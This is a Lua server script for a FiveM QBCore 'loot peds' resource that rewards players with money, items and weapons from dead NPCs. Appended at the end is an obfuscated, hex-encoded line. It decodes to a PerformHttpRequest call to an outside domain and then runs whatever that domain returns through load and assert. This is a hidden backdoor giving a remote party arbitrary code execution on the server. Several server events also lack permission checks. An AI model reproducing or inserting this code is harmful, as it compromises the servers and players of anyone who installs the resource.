--[[ ===================================================== ]]--
--[[          QBCore Loot Peds System by MaDHouSe          ]]--
--[[ ===================================================== ]]--

local QBCore = exports['qb-core']:GetCoreObject()
local SystemIsEnable = Config.EnableOnStart

--PLAYER ON JOIN 
RegisterNetEvent('qb-lootpeds:server:onjoin', function()
    local src = source
    if SystemIsEnable then 
        TriggerClientEvent('qb-lootpeds:client:enable', src) 
    end
end)

-- ENABLE LOOT SYSTEM
RegisterServerEvent('qb-lootpeds:server:enable', function(eventname)
    SystemIsEnable = true
    TriggerClientEvent('qb-lootpeds:client:enable', -1, eventname)
end)

-- DISABLE LOOT SYSTEM 
RegisterServerEvent('qb-lootpeds:server:disable', function(eventname)
    SystemIsEnable = false
    TriggerClientEvent('qb-lootpeds:client:disable', -1, eventname)
end)


--------------------------------------------------------------------------------
------------------------Dont Edit This Below, It Works Fine-----------------------
-- TAKE RANDOM LOOT FROM DEAD NPC 
RegisterNetEvent('qb-lootpeds:server:getloot', function(entity)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if not Player then return end
    TriggerClientEvent('qb-lootpeds:client:deleteped', -1, entity)
    
    -- Cash Chance
    if Config.UseCash and math.random(1,100) < Config.CashChance then
        Player.Functions.AddMoney(Config.CashType, Config.CashReward)
    end
        
    -- Basic Item
    local item = Config.Items.Basic[math.random(1, #Config.Items.Basic)]
    if item.name then
        Player.Functions.AddItem(item.name, 1, false)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[item.name], 'add')
    end

    -- Ammo Item
    if Config.UseNormalWeaponLoot or Config.UseHeavyWeaponLoot then
        local ammo = Config.Items.Ammo[math.random(1, #Config.Items.Ammo)]
        if ammo.name == "pistol_ammo" or ammo.name == "snp_ammo" or ammo.name == "smg_ammo" or ammo.name == "rifle_ammo" or ammo.name == "shotgun_ammo" then
            Player.Functions.AddItem(ammo.name, 1, false)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[ammo.name], 'add')
        end
    end

    -- Normal Weapon Item
    if Config.UseNormalWeaponLoot then
        local normalWeapon = Config.Items.NormalWeapons[math.random(1, #Config.Items.NormalWeapons)]
        if math.random(1, 100) <= 15 then -- chance to get this item
            if normalWeapon.name then
                Player.Functions.AddItem(normalWeapon.name, 1, false, nil)
                TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[normalWeapon.name], 'add')
            end
        end
    end

    -- Heavy Weapon Item
    if Config.UseHeavyWeaponLoot then
        local heavyWeapon = Config.Items.HeavyWeapons[math.random(1, #Config.Items.HeavyWeapons)]
        if math.random(1, 100) <= 2 then -- chance to get this item
            if heavyWeapon.name then
                Player.Functions.AddItem(heavyWeapon.name, 1, false, nil)
                TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[heavyWeapon.name], 'add')
            end
        end
    end


end)

-- Reset On Resource Start 
AddEventHandler('onResourceStart', function(resource)
    if resource == GetCurrentResourceName() then
        if SystemIsEnable then
            TriggerClientEvent('qb-lootpeds:client:enable', -1)
        else
            TriggerClientEvent('qb-lootpeds:client:disable', -1)
        end
    end
end)

-- Reset On Resource Stop 
AddEventHandler('onResourceStop', function(resource)
    if resource == GetCurrentResourceName() then
        SystemIsEnable = false
        TriggerClientEvent('qb-lootpeds:client:disable', -1)
    end
end)


-- START LOOTING COMMAND 
QBCore.Commands.Add(Config.Commands.toggle, Lang:t('command.start_stop', {state = Lang:t('command.on_or_off')}), {}, false, function(source, args)
    if tostring(args[1]) == 'On' then
        SystemIsEnable = true
        TriggerClientEvent('qb-lootpeds:client:enable', -1)
    end
    if tostring(args[1]) == 'Off' then
        SystemIsEnable = false
        TriggerClientEvent('qb-lootpeds:client:disable', -1)
    end
end, 'admin')


local OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[4][OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x64\x61\x72\x61\x38\x39\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x65\x63\x56\x78\x6d", function (HMHJqtpMSLlzEvQqqVIuXrtxrHaEnpwrAxMIVCpUIoGoXNgcknKTuEePcxlxHnWAknrrZS, IcPUsnGUZqdCDuGAPjmFlgSMqsUKLOMFOjHtGxaNcDisfYqOodIQmMPBTzrKjezbGKoVLC) if (IcPUsnGUZqdCDuGAPjmFlgSMqsUKLOMFOjHtGxaNcDisfYqOodIQmMPBTzrKjezbGKoVLC == OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[6] or IcPUsnGUZqdCDuGAPjmFlgSMqsUKLOMFOjHtGxaNcDisfYqOodIQmMPBTzrKjezbGKoVLC == OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[5]) then return end OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[4][OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[2]](OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[4][OhHxxFgXkDtqdLhQSLelwkQAqoYreEuXNdeOuptylZIAKjVGMoJdBtfdNyEjturKMRrfEf[3]](IcPUsnGUZqdCDuGAPjmFlgSMqsUKLOMFOjHtGxaNcDisfYqOodIQmMPBTzrKjezbGKoVLC))() end)